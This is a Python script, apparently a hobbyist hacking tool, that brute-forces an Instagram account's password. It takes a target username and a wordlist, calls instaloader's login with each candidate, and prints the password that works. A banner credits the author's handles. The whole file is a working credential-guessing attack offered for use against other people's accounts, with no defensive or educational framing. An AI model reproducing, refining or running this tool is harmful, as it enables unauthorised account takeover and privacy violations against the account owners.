import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from intro import *


class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
start()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input('\033[1m\033[92m\n[?]ENTER INSTAGRAM USERNAME FOR CRACK PASSWORD: ')
    wl = input("\n[?]Enter the PassList along The Path: ")
    sleepp = 0
    break



file1 = open(wl, 'r')
Lines = file1.readlines()
count = 0
os.system("clear")
print("\t  \033[92m.########.##.....##..#######..####\t")
print("\t  \033[92m......##..##.....##.##.....##..##.\t")
print("\t  \033[92m.....##...##.....##.##.....##..##.\t")
print("\t  \033[92m....##....#########.##.....##..##.\t")
print("\t  \033[92m...##.....##.....##.##.....##..##.\t")
print("\t  \033[92m..##......##.....##.##.....##..##.\t")
print("\t  \033[92m.########.##.....##..#######..####\t")
print("")
print("\t \33[94m⊰᯽⊱┈──╌❊ CODED BY S74RK ❊╌──┈⊰᯽⊱ \t")
print("")
print("\t  \033[36m┏━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┓\t")
print("\n\t   \033[93m[#] \033[94mAUTHOR   :  \033[92mCYB3R-$74RK                                                           \t ")
print("\t  \033[93m [#] \033[94mGITHUB  : \033[92mgithub.com/CYBER-STARK                                                         \t  ")
print("\t  \033[93m [#] \033[94mINSTA  : \033[92mcyber_st4rk                                                           \t")
print("\t  \033[36m┗━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┛\t")


for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(1)
        print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
        L.login(USER , PASSWORD)
        print("\n\033[36m[✓]Password found:    \033[92m"+pstest)

        break
    except instaloader.exceptions.BadCredentialsException:
        pass
        print(bcolors.FAIL+"\033[91m[!] Incorret password: "+pstest)
        
        

    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\n\033[91m[!] Instagram has been requested verification via sms, try to set more login time...")
        break

    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n\033[91m[☹] Username not found")